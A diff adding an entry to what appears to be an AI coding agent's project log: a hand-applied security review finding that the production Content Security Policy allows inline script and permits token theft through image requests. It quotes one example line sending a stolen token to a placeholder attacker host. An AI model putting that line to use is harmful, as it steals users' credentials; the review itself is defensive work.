@@ -7302,3 +7302,41 @@ for this branch; implementation needs a browser.
 cannot-relocate-client-side conclusion (all backed by failing/passing command output above).
 PARTIAL for the task as written — the credentials were **not** moved; the required server change is
 specified instead, per the task's own escape clause.
+
+## 2026-08-18 — G3 follow-on: the CSP does not mitigate the localStorage exposure, and does not contain exfiltration (chore/w5-vettrack-residue)
+
+**Claim:** No code changed. Applying the `security-reviewer` checklist to the credential surface
+found that the production CSP neither prevents the XSS that reads those credentials nor stops the
+attacker sending them out. This raises the severity of the previous entry and removes "the CSP
+protects us" as an available answer.
+
+**Tooling note (a known hole, stated rather than skipped):** `verify-security` / `verify-quality`
+do not exist despite `~/.claude/rules/ccg-skills.md` listing them. The
+`security-reviewer` **agent** does exist — `.claude/agents/security-reviewer.md:1-6`, project-scoped
+— but this session has no subagent-dispatch tool (`ListAgents` returns no dispatchable local agent
+and there is no `Task` tool), so its workflow was applied by hand rather than delegated. Flagged so
+the result is not read as an agent-verified review.
+
+**Evidence:**
+- `server/index.ts:127-133` (`scriptSrc`) and `:135-141` (`scriptSrcElem`) both list
+  `"'unsafe-inline'"` **unconditionally** — only `'unsafe-eval'` is gated behind `!isProduction`
+  (`...(isProduction ? [] : ["'unsafe-eval'"])`). Production therefore permits injected inline
+  script, so the CSP is not a control against the XSS that reads `localStorage`.
+- `server/index.ts:159` — `imgSrc: ["'self'", "data:", "https:"]`. `connectSrc` (`:143-158`) is
+  correctly narrow (`'self'` + Clerk hosts), so `fetch()` exfiltration is blocked — but a stolen
+  token can still leave over `new Image().src = "https://<attacker>/?t=" + token`, which `imgSrc:
+  https:` permits. Blocking `connectSrc` alone does not contain exfiltration.
+- Consequence for the previous entry: the mitigation offered there for `__vt_clerk_client_jwt`
+  ("it cannot be relocated, so rely on preventing XSS") holds on the Capacitor origin, where the
+  bundle is local, but **not** on the web origin that serves `/board`. The display token's httpOnly
+  migration is the load-bearing fix, not a nicety.
+- Scope discipline: `server/index.ts` is on neither concurrent workflow's owned list, so tightening
+  the CSP is landable — but it is a separate change with its own blast radius (Clerk injects inline
+  script; a nonce/hash rollout needs browser verification), and this branch has no browser. Not
+  attempted.
+
+**Verification:** `git status --short` → only this log entry. `npx tsc --noEmit` → exit 0 (unchanged;
+no source touched).
+
+**Verdict:** VERIFIED for both CSP readings (`file:line` quoted above). NOT ACTED ON — CSP hardening
+is specified as follow-on work, not performed.
